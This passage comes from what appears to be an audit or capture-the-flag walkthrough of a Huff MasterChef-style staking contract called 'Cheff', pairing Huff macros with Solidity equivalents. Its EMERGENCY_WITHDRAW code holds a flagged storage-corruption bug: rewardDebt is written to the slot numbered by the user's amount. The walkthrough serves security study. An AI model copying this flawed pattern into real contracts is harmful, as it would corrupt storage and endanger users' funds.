</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushiReward * 1e12 / lpSupply, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare, sushiReward * 1e12 / lpSupply, pool_slot]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.accSushiPerShare + (sushiReward * 1e12 / lpSupply), pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot + 3, newAccSushiPerShare, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[pool_slot + 3] = newAccSushiPerShare
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>number
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock, pool_slot]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[pool_slot + 2] = currentBlock
</span><span>
</span><span>    end_jump:
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: updatePool()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>updatePool</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    </span><span style=color:#62a35c>_updatePool</span><span>(pid);
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updatePool</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number &lt;=</span><span> pool.lastRewardBlock) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> lpSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.lpToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(lpSupply </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>        pool.lastRewardBlock </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number</span><span>;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> multiplier </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getMultiplier</span><span>(pool.lastRewardBlock, </span><span style=color:#a71d5d;font-weight:700>block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number</span><span>);
</span><span>    </span><span style=color:#0086b3>uint256</span><span> sushiReward </span><span style=color:#a71d5d;font-weight:700>=</span><span> multiplier </span><span style=color:#a71d5d;font-weight:700>*</span><span> sushiPerBlock </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.allocPoint </span><span style=color:#a71d5d;font-weight:700>/</span><span> totalAllocPoint;
</span><span>
</span><span>    sushi.</span><span style=color:#62a35c>mint</span><span>(devaddr, sushiReward </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>10</span><span>);
</span><span>    sushi.</span><span style=color:#62a35c>mint</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), sushiReward);
</span><span>
</span><span>    pool.accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.accSushiPerShare </span><span style=color:#a71d5d;font-weight:700>+ </span><span>(sushiReward </span><span style=color:#a71d5d;font-weight:700>*</span><span> 1e12 </span><span style=color:#a71d5d;font-weight:700>/</span><span> lpSupply);
</span><span>    pool.lastRewardBlock </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number</span><span>;
</span><span>}
</span></code></pre></div></div><p>Solidity abstracts the conditional logic and storage operations with cleaner syntax.<hr><h4 id=migrate-migrate-lp-tokens>MIGRATE() - Migrate LP Tokens</h4><p>Migrates LP tokens to a new contract via the migrator contract. This function introduces critical opcodes for external contract interaction: <code>call</code> executes a call to another contract with specified gas, address, value, input data, and captures return data; <code>returndatasize</code> returns the size of data returned by the last external call; <code>gas</code> pushes the remaining gas onto the stack. The function demonstrates external contract calls with return data validation, uses <code>SAFE_APPROVE()</code> to approve ERC20 token spending by the migrator contract, and employs <code>__RIGHTPAD(selector)</code> to properly format function selectors. The migration process validates the migrator exists, approves the LP token balance to the migrator, calls the migrator's migrate function, verifies the returned new LP token address is valid, and updates the pool to use the new LP token.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: MIGRATE()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MIGRATE</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[MIGRATOR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [migrator, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [migrator != 0, migrator]
</span><span>
</span><span>    is_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [migrator]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Revert if No Migrator =====
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(NoMigrator) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>
</span><span>    is_not_zero_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [migrator]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, migrator]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(1) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 address
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, pool.lpToken, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance, pool.lpToken, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 swap1 dup5
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [migrator, balance, pool.lpToken, balance, pool.lpToken, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_APPROVE</span><span>(</span><span style=color:#0086b3>0x20</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(3) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance, pool.lpToken, pool_slot, migrator]
</span><span>    </span><span style=color:#969896;font-style:italic>// Approves migrator to spend LP tokens
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Call Migrator.migrate(lpToken) =====
</span><span>    </span><span style=color:#62a35c>__RIGHTPAD</span><span>(</span><span style=color:#0086b3>0xce5494bb</span><span>) </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance, pool.lpToken, pool_slot, migrator]
</span><span>    </span><span style=color:#969896;font-style:italic>// Function selector for migrate(address)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance, pool.lpToken, pool_slot, migrator]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores pool.lpToken as argument at memory[0x24]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x20 0x24 0x20 0x00 0x20
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [0x20, 0x00, 0x20, 0x24, 0x20, pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap5 gas call
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [success, pool.lpToken, balance, pool_slot, migrator]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calls migrator.migrate(lpToken) with 32-byte return
</span><span>
</span><span>    call_success_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(CallFailed) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>
</span><span>    call_success_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>returndatasize
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [returnDataSize, pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    size_is_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(ReturnDataSizeIsZero) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>
</span><span>    size_is_not_zero_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Validate New LP Token Balance =====
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newLpToken, pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>address
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newLpToken, pool.lpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x40</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(2) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newBalance, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [oldBalance, newBalance, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>eq </span><span>balances_equal_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance, pool_slot, migrator]
</span><span>
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(ReturnDataSizeIsZero) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>
</span><span>    balances_equal_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Update Pool LP Token =====
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newLpToken, balance, pool_slot, migrator]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, migrator]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores newLpToken to pool_slot
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent : migrate()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>migrate</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#0086b3>address</span><span>(migrator) </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0), </span><span style=color:#183691>"NoMigrator"</span><span>);
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>    </span><span style=color:#0086b3>address</span><span> lpToken </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(pool.lpToken);
</span><span>    </span><span style=color:#0086b3>uint256</span><span> bal </span><span style=color:#a71d5d;font-weight:700>=</span><span> lpToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>
</span><span>    lpToken.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(migrator), bal);
</span><span>    </span><span style=color:#0086b3>address</span><span> newLpToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> migrator.</span><span style=color:#62a35c>migrate</span><span>(lpToken);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(bal </span><span style=color:#a71d5d;font-weight:700>==</span><span> newLpToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)), </span><span style=color:#183691>"BadMigrate"</span><span>);
</span><span>    pool.lpToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> newLpToken;
</span><span>}
</span></code></pre></div></div><hr><h4 id=dev-update-developer-address>DEV() - Update Developer Address</h4><p>Allows the current developer to update the developer address. This function implements a simple access control pattern where only the current dev address can designate a new dev address, using the <code>eq</code> opcode to compare msg.sender with the stored devaddr and conditionally jumping to allow the update or reverting with an Unauthorized error.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code : DEV()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>DEV</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [currentDevAddr]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller eq
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender == currentDevAddr]
</span><span>
</span><span>    only_dev_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Revert if Not Developer =====
</span><span>    </span><span style=color:#62a35c>__ERROR</span><span>(Unauthorized) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>
</span><span>    only_dev_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newDevAddr]
</span><span>
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Updates developer address
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: dev()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>dev</span><span>(</span><span style=color:#0086b3>address </span><span>_devaddr) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> devaddr, </span><span style=color:#183691>"Unauthorized"</span><span>);
</span><span>    devaddr </span><span style=color:#a71d5d;font-weight:700>=</span><span> _devaddr;
</span><span>}
</span></code></pre></div></div><p>Solidity provides the require statement for cleaner access control validation.<hr><h4 id=emergency-withdraw-emergency-lp-token-withdrawal>EMERGENCY_WITHDRAW() - Emergency LP Token Withdrawal</h4><p>Allows users to withdraw all staked LP tokens without claiming rewards in emergency situations. This function is simpler than WITHDRAW() as it skips reward calculations and pool updates, immediately transferring the user's full LP token balance and resetting their state to zero. However, this implementation contains a critical vulnerability in the stack manipulation during the state reset phase.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: EMERGENCY_WITHDRAW()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>EMERGENCY_WITHDRAW</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>CHECK_PID</span><span>()  </span><span style=color:#969896;font-style:italic>// takes(1) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller dup2 </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [USER_INFO_SLOT, pid, msg.sender, pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(3) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot, pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calculates storage slot for userInfo[pid][msg.sender]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for sha3 computation
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, user.amount, user_slot, pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup4
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid, user.rewardDebt, user.amount, user_slot, pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(1) returns(1)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, user.rewardDebt, user.amount, user_slot, pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for sha3 computation
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpToken, user.rewardDebt, user.amount, user_slot, pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, user.amount, lpToken, user.rewardDebt, user.amount, user_slot, pid]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  </span><span style=color:#969896;font-style:italic>// takes(3) returns(0)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, user.amount, user_slot, pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Transfers user.amount LP tokens from contract to msg.sender
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for transfer call encoding
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Prepare Event Data =====
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, user.amount, user_slot, pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: user.amount (32 bytes) for event data
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3 caller
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [msg.sender, pid, user.amount, user_slot, user.rewardDebt]
</span><span>
</span><span>    </span><span style=color:#62a35c>__EVENT_HASH</span><span>(EmergencyWithdraw)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [event_sig, msg.sender, pid, user.amount, user_slot, user.rewardDebt]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>log3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot, user.rewardDebt]
</span><span>    </span><span style=color:#969896;font-style:italic>// Emits: EmergencyWithdraw(msg.sender indexed, pid indexed, user.amount)
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ===== Reset User State =====
</span><span>    </span><span style=color:#0086b3>0x00
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [0x00, user.amount, user_slot, user.rewardDebt]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt, user.amount, user_slot, 0x00]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user.rewardDebt, user_slot, 0x00]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sstore  </span><span style=color:#969896;font-style:italic>// @audit-issue Incorrect stack manipulation
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot, 0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[user.amount] = user.rewardDebt
</span><span>    </span><span style=color:#969896;font-style:italic>// Writes user.rewardDebt to storage slot number equal to user's staked amount!
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[user_slot] = 0x00 => user.amount = 0
</span><span>    </span><span style=color:#969896;font-style:italic>// Correctly zeros user.amount
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: emergencyWithdraw()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>emergencyWithdraw</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>    UserInfo </span><span style=color:#a71d5d;font-weight:700>storage </span><span>user </span><span style=color:#a71d5d;font-weight:700>=</span><span> userInfo[pid][msg.sender];
</span><span>    </span><span style=color:#0086b3>uint256</span><span> amount </span><span style=color:#a71d5d;font-weight:700>=</span><span> user.amount;
</span><span>
</span><span>    pool.lpToken.</span><span style=color:#62a35c>safeTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>EmergencyWithdraw</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, pid, amount);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
</span><span>        </span><span style=color:#62a35c>sstore</span><span>(user.amount, user.rewardDebt)
</span><span>        </span><span style=color:#969896;font-style:italic>// @audit-issue: Storing user.rewardDebt at slot number user.amount
</span><span>        </span><span style=color:#969896;font-style:italic>// This overwrites arbitrary storage slots instead of resetting user state
</span><span>    }
</span><span>    user.amount = 0;
</span><span>}
</span></code></pre></div></div><p>The Solidity equivalent demonstrates how the vulnerability translates to high-level code using inline assembly to expose the incorrect storage operations.<p>The final storage operations exhibit undefined behavior due to incorrect stack manipulation. Instead of properly zeroing user storage, the code writes to arbitrary storage locations.<hr><h3 id=cheff-contract-functionality-overview>Cheff Contract Functionality Overview</h3><p>Cheff is a yield farming protocol that implements a MasterChef-style staking rewards system in Huff. The protocol allows users to stake LP (Liquidity Provider) tokens from various pools and earn SUSHI token rewards proportional to their stake and the pool's allocation weight. The contract manages multiple staking pools, each with configurable allocation points that determine the share of SUSHI rewards distributed to that pool's stakers.<p>Each pool represents a different LP token that users can stake. Pools are identified by a pool ID (pid) and contain:<ul><li><strong>lpToken</strong>: The ERC20 LP token address users stake<li><strong>allocPoint</strong>: Allocation points determining the pool's share of total SUSHI rewards<li><strong>lastRewardBlock</strong>: The last block number where reward distribution was calculated<li><strong>accSushiPerShare</strong>: Accumulated SUSHI rewards per staked LP token (scaled by 1e12 for precision)</ul><p>For each pool, users 